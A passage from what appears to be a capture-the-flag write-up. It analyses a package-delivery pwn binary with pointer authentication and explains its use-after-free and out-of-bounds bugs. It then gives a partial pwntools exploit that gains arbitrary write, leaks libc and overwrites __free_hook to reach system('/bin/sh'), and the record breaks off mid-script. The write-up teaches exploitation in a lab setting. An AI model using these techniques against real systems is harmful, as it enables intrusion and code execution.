</span></span></code></pre></div><p><code>useless</code> and <code>useless2</code> print some text and call <code>exit(0)</code>, so I&rsquo;m leaving this part out. We have 5 legitimate options excluding exit.</p><h3 id=send_package>send_package<a hidden class=anchor aria-hidden=true href=#send_package>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>send_package</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (packages_len <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x14</span>) {
</span></span><span style=display:flex><span>    package<span style=color:#f92672>*</span> pkg <span style=color:#f92672>=</span> (package <span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x18</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> idx <span style=color:#f92672>=</span> (<span style=color:#66d9ef>long</span>)packages_len;
</span></span><span style=display:flex><span>    packages_len <span style=color:#f92672>=</span> packages_len <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    packages[idx] <span style=color:#f92672>=</span> pkg;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> address <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x18</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Please enter your destination address:&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fgets</span>(address,<span style=color:#ae81ff>0x18</span>,stdin);
</span></span><span style=display:flex><span>    pkg<span style=color:#f92672>-&gt;</span>address <span style=color:#f92672>=</span> address;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fread</span>(<span style=color:#f92672>&amp;</span>pkg<span style=color:#f92672>-&gt;</span>urandom_num,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>4</span>,urandom_fd);
</span></span><span style=display:flex><span>    address <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>pointer_auth_tech</span>(print_pkg_arrival,pkg<span style=color:#f92672>-&gt;</span>urandom_num);
</span></span><span style=display:flex><span>    pkg<span style=color:#f92672>-&gt;</span>pointer_auth <span style=color:#f92672>=</span> address;
</span></span><span style=display:flex><span>    pkg<span style=color:#f92672>-&gt;</span>idx <span style=color:#f92672>=</span> packages_len <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Sorry, we are swiss but we can</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t handle so many packages&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can allocate upto <code>0x14 = 20</code> <code>package</code>s. I have defined each <code>package</code> as below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> package {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// pointer to 0x18-long malloc&#39;ed char array
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span>[<span style=color:#ae81ff>0x18</span>]<span style=color:#f92672>*</span> address;  <span style=color:#75715e>// 0x00
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> idx;              <span style=color:#75715e>// 0x08
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> urandom_num       <span style=color:#75715e>// 0x0C
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> pointer_auth    <span style=color:#75715e>// 0x10
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} <span style=color:#75715e>// 0x18 bytes long
</span></span></span></code></pre></div><p>The only input is the 0x18-bytes long package address. There is a very weird calculation in <code>pointer_auth_tech</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>ulong <span style=color:#a6e22e>pointer_auth_tech</span>(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> fnaddr, <span style=color:#66d9ef>int</span> num) {
</span></span><span style=display:flex><span>  ulong uVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>pacga</span>(fnaddr, num);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> fnaddr <span style=color:#f92672>^</span> uVar1 <span style=color:#f92672>&amp;</span> const_FFFF000000000000;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>where <code>pacga</code> is a ARM64 instruction related to Pointer Authentication Code. Seems like a function pointer is &lsquo;protected&rsquo; by pointer authentication using a random seed from <code>/dev/urandom</code>.</p><p>The function pointer is initially set to <code>print_pkg_arrival</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>print_pkg_arrival</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> arg) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The package has arrived to: %s!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,arg);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=report_lost_package>report_lost_package<a hidden class=anchor aria-hidden=true href=#report_lost_package>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>report_lost_package</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Which package did you lose?&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> <span style=color:#a6e22e>read_int</span>(idx);
</span></span><span style=display:flex><span>  <span style=color:#75715e>// BUG: UaF, also no bounds check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>free</span>(packages[idx]<span style=color:#f92672>-&gt;</span>address);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x12</span>) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> idx)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>free</span>(packages[idx]);
</span></span><span style=display:flex><span>    packages[idx] <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;You definitely did not.&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We have a Use-After-Free when we provide an index not lesser than 0x12, which <code>free</code>s the package address at that index but does not remove the package from the <code>packages</code> array. This leaves us with a package with dangling reference to <code>free</code>d memory, which we can use (Use-After-Free).</p><p>Furthermore, the index can be negative. So we can <code>free</code> the address of a supposed package that is before the <code>packages</code> array.</p><h3 id=list_packages>list_packages<a hidden class=anchor aria-hidden=true href=#list_packages>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>list_packages</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;---&#34;</span>);
</span></span><span style=display:flex><span>  uint state <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> packages_len; i <span style=color:#f92672>=</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Address: %s&#34;</span>,packages[i]<span style=color:#f92672>-&gt;</span>address);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;id: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,(ulong)(uint)packages[i]<span style=color:#f92672>-&gt;</span>idx);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> cb <span style=color:#f92672>=</span> <span style=color:#a6e22e>undo_pacga</span>(packages[i]<span style=color:#f92672>-&gt;</span>pointer_auth, packages[i]<span style=color:#f92672>-&gt;</span>urandom_num);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;callback: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cb);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> pointer <span style=color:#f92672>=</span> packages[i]<span style=color:#f92672>-&gt;</span>pointer_auth;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> pac <span style=color:#f92672>=</span> <span style=color:#a6e22e>pointer_auth_tech</span>(
</span></span><span style=display:flex><span>      (ulong)packages[i]<span style=color:#f92672>-&gt;</span>pointer_auth <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span>const_FFFF000000000000,
</span></span><span style=display:flex><span>      packages[i]<span style=color:#f92672>-&gt;</span>urandom_num);
</span></span><span style=display:flex><span>    state <span style=color:#f92672>=</span> <span style=color:#a6e22e>some_crc32_thing</span>(state, pointer <span style=color:#f92672>^</span> pac);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;---&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Error state: %x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, state);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Here we can see that we have an base address leak since the address of the callback is printed out, which is initially set the <code>print_pkg_arrival</code>. There also seems to be some calculation involving the pointer authentication that I thought involved CRC32 calculations due to the use of <code>0xedb88320</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>uint <span style=color:#a6e22e>some_crc32_thing</span>(uint prev_state, ulong arg) {
</span></span><span style=display:flex><span>  uint n <span style=color:#f92672>=</span> <span style=color:#f92672>~</span>prev_state;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (uint i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; (<span style=color:#66d9ef>int</span>)i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>8</span>; i <span style=color:#f92672>=</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> n <span style=color:#f92672>^</span> (uint)((<span style=color:#66d9ef>long</span>)((<span style=color:#66d9ef>long</span>)(<span style=color:#ae81ff>0xff</span> <span style=color:#f92672>&lt;&lt;</span> (ulong)((i <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>3</span>)) <span style=color:#f92672>&amp;</span> arg) <span style=color:#f92672>&gt;&gt;</span>
</span></span><span style=display:flex><span>                  ((ulong)(i <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x3f</span>));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (uint b <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>; <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> b; b <span style=color:#f92672>=</span> b <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>      n <span style=color:#f92672>=</span> n <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>^</span> <span style=color:#f92672>-</span>(n <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xedb88320</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#f92672>~</span>n;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=set_address_package>set_address_package<a hidden class=anchor aria-hidden=true href=#set_address_package>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>set_address_package</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Which package do you want to edit?&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#75715e>// BUG: no bounds check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> <span style=color:#a6e22e>read_int</span>(idx);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Please enter the new address:&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>heap_addr_ref <span style=color:#f92672>&lt;</span> packages[idx]<span style=color:#f92672>-&gt;</span>address) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;This address is not in Switzerland!&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> read <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>(packages[idx]<span style=color:#f92672>-&gt;</span>address,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0x18</span>,stdin);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;read %d bytes</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, read);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;New address: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,packages[idx]<span style=color:#f92672>-&gt;</span>address);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> cb <span style=color:#f92672>=</span> <span style=color:#a6e22e>undo_pacga</span>(packages[idx]<span style=color:#f92672>-&gt;</span>pointer_auth, packages[idx]<span style=color:#f92672>-&gt;</span>urandom_num);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;New callback: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cb);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This function from the lack of bounds check as well. Interestingly enough, it prints the callback even though it was never changed (this is for the intended solution).</p><h3 id=check_package_arrival>check_package_arrival<a hidden class=anchor aria-hidden=true href=#check_package_arrival>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>check_package_arrival</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Which package do you want to check?&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> <span style=color:#a6e22e>read_int</span>();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> cb <span style=color:#f92672>=</span> <span style=color:#a6e22e>undo_pacga</span>(packages[idx]<span style=color:#f92672>-&gt;</span>pointer_auth, packages[idx]<span style=color:#f92672>-&gt;</span>urandom_num);
</span></span><span style=display:flex><span>  (cb)(packages[idx]<span style=color:#f92672>-&gt;</span>address);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This method calls the callback that was set with the address of the package as the argument. Again, same lack of bounds check applies here. Sadly, <code>undo_pacga</code> returns a address only if it was protected by pointer authentication, or it returns 0 (which causes segfault when executed).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>ulong <span style=color:#a6e22e>undo_pacga</span>(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> pointer, ulong urandom_num) {
</span></span><span style=display:flex><span>  ulong ret <span style=color:#f92672>=</span> pointer <span style=color:#f92672>^</span> pointer <span style=color:#f92672>&amp;</span> const_FFFF000000000000;
</span></span><span style=display:flex><span>  ulong check <span style=color:#f92672>=</span> <span style=color:#a6e22e>pacga</span>(ret, urandom_num);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((check <span style=color:#f92672>&amp;</span> const_FFFF000000000000) <span style=color:#f92672>!=</span> (pointer <span style=color:#f92672>&amp;</span> const_FFFF000000000000)) {
</span></span><span style=display:flex><span>    ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>We have 3 out-of-bounds vuln which treat parts of the .data as a <code>package*</code>, and one UaF.</p><p>Initially, I was trying to use the UaF to corrupt a package and write my own function pointer there to get it executed (after bypassing PAC). I believe this to be the intended solution by the author.</p><p>However, while trying to do this, I realized that there was a easier way to approach the problem.</p><h3 id=arbitrary-write>Arbitrary Write<a hidden class=anchor aria-hidden=true href=#arbitrary-write>#</a></h3><p>In every binary compiled by GCC, there exists an address in the <code>.data</code> section that points to itself. That is, the value at the address is the address itself.</p><p><img loading=lazy src=https://i.imgur.com/eUV8ATD.png alt></p><p>This also happens to be before the <code>packages</code> array:</p><p><img loading=lazy src=https://i.imgur.com/AWizqlV.png alt></p><p>If we provide <code>(0x113008-0x113040) / sizeof(package*)</code> as the index to <code>set_address_package</code>, it will treat this self-loop address as a <code>package*</code>. It will get the <code>address</code> pointer, which is at <code>package->address = package[0]</code> as the <code>address</code> is the first element of <code>package</code>. This, of course, is the self-loop address again. Then, we can write 0x18 bytes to this address. Note that there is a <code>*heap_addr_ref &lt; package[i]->address</code> check, which does not get triggered since the heap is <em>after</em> the base of the program.</p><p>This allows us to gain control over some memory in the <code>.data</code> section. However, just this is enough to get an arbitrary write primitive! We can setup our write to do the following (right side is the &rsquo;effect&rsquo;):</p><p><img loading=lazy src=https://i.imgur.com/Hwmk3s0.png alt></p><p>Now if we treat <code>(0x113010-0x113040) / sizeof(package*)</code> (the pointer after the self-loop) as a <code>package*</code>, it&rsquo;s set up as below:</p><p><img loading=lazy src=https://i.imgur.com/Ji26wt5.png alt></p><p>Since we are writing to <code>address</code>, we now have arbitrary write using <code>set_address_package</code> when targetting this index. Furthermore, since the self-loop still points to itself afterwards, we can use this arbwrite as many times as we want.</p><h3 id=libc-leak>Libc Leak<a hidden class=anchor aria-hidden=true href=#libc-leak>#</a></h3><p>There is no fancy <code>win</code> function in the binary itself, so we must leak a libc address to get us going.</p><p>Since we have arbitrary write and know the base address, we can overwrite <code>packages[0..3]</code> to a forged package, whose address is pointing to an address we want to leak e.g. <code>printf.got</code>. Running <code>list_packages</code> will then leak out the bytes we want.</p><h3 id=getting-command-execution>Getting command execution<a hidden class=anchor aria-hidden=true href=#getting-command-execution>#</a></h3><p>With a libc address and base address known, one would normally overwrite the GOT section to gain command execution, but here it&rsquo;s protected by full RELRO and is not writable.</p><p>We can try to overwrite <code>__free_hook</code> instead but we are blocked by the <code>*heap_addr_ref</code> check. But of course, since we have arb write, we can just overwrite this as well. Our aim will be to get <code>free</code> called in <code>report_lost</code>, and we provide the index of a package with address set to <code>/bin/sh</code> to get <code>system("/bin/sh")</code> executed.</p><h2 id=final-script>Final Script<a hidden class=anchor aria-hidden=true href=#final-script>#</a></h2><p>The overwriting of <code>heap_addr_ref</code> is combined with creation of a forged package, but the rest are as above.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#p = remote(&#34;localhost&#34;, &#34;3700&#34;)</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;chall.polygl0ts.ch&#34;</span>, <span style=color:#ae81ff>3700</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_package</span>(address):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;menu is too long&#34;</span>, <span style=color:#e6db74>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;address:&#34;</span>, address)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>report_lost</span>(idx):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;menu is too long&#34;</span>, <span style=color:#e6db74>&#34;2&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;lose?&#34;</span>, str(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>list_packages</span>():
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;menu is too long&#34;</span>, <span style=color:#e6db74>&#34;3&#34;</span>)
</span></span><span style=display:flex><span>    pkgs <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Error&#34;</span> <span style=color:#f92672>in</span> p<span style=color:#f92672>.</span>recvuntil((<span style=color:#e6db74>&#34;Error&#34;</span>, <span style=color:#e6db74>&#34;Address&#34;</span>)):
</span></span><span style=display:flex><span>            p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;: &#34;</span>)
</span></span><span style=display:flex><span>            error_state <span style=color:#f92672>=</span> int(p<span style=color:#f92672>.</span>recvline()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;: &#34;</span>)
</span></span><span style=display:flex><span>        address <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;id: &#34;</span>, drop<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>        id <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;callback: &#34;</span>)
</span></span><span style=display:flex><span>        cb <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> cb <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;(nil)&#39;</span>:
</span></span><span style=display:flex><span>            cb <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            cb <span style=color:#f92672>=</span> int(cb, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;---&#34;</span>)
</span></span><span style=display:flex><span>        pkgs<span style=color:#f92672>.</span>append((address, id, cb))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> pkgs, error_state
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>set_address</span>(idx, address):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;menu is too long&#34;</span>, <span style=color:#e6db74>&#34;4&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;edit?&#34;</span>, str(idx))
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;address:&#34;</span>, address)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>send_package(str(<span style=color:#ae81ff>0</span>))
</span></span><span style=display:flex><span>pkgs, _ <span style=color:#f92672>=</span> list_packages()
</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> pkgs[<span style=color:#ae81ff>0</span>][<span style=color:#ae81ff>2</span>] <span style=color:#f92672>-</span> <span style=color:#ae81ff>0xedc</span>
</span></span><span style=display:flex><span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span> hex(base) <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># just create some packages</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>    send_package(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>arbwrite</span>(where, what):
</span></span><span style=display:flex><span>    set_address(<span style=color:#f92672>-</span>(<span style=color:#ae81ff>0x113048</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x113008</span>)<span style=color:#f92672>//</span><span style=color:#ae81ff>8</span>, p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x13008</span>) <span style=color:#f92672>+</span> p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x13018</span>) <span style=color:#f92672>+</span> p64(where))
</span></span><span style=display:flex><span>    set_address(<span style=color:#f92672>-</span>(<span style=color:#ae81ff>0x113048</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x113010</span>)<span style=color:#f92672>//</span><span style=color:#ae81ff>8</span>,  what)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Overwrite heap_addr_ref to point to base+0x13030, which contains 0xfffff....</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Also put the address of printf.got here so that we can use it as a forged package.</span>
</span></span><span style=display:flex><span>arbwrite(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x13028</span>, p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x13030</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0xffffffffffffffff</span>) <span style=color:#f92672>+</span> p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x12f78</span>)) <span style=color:#75715e># printf.got @ +0x13038</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write the address of the forged package as the packages of the first 3 elements in the packages array</span>
